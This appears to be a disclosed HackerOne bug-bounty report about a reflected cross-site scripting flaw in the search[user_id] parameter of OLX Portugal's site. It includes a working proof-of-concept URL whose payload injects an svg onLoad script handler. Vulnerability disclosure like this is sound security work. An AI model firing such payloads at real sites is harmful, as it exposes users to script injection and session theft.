@@ -1,0 +1,25 @@
+ReportLink:https://hackerone.com/reports/477771
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/paulochoupina
+ReportedTo:OLX(olx)
+BountyAmount:
+Severity:critical
+State:Closed
+DateOfDisclosure:03.03.2019 19:22:40
+
+Summary:
+
+Hi, how you doing?
+
+This is a pretty straight foward XSS in the main page.
+
+Affected parameter: search[user_id]
+
+Direct Link:
+https://www.olx.pt/braga/?search[user_id]=1zqjeu'"(){}<x>:/1zqjeu;9</SCript><svG/onLoad=prompt(9)>, ;prompt(9);&view=galleryWide
+
+Tested in updated firefox.
+
+## Impact
+
+XSS allows a intruder to inject html and client side scripts in the browser of a victim, allowing for example the stealing of session cookies etc etc.
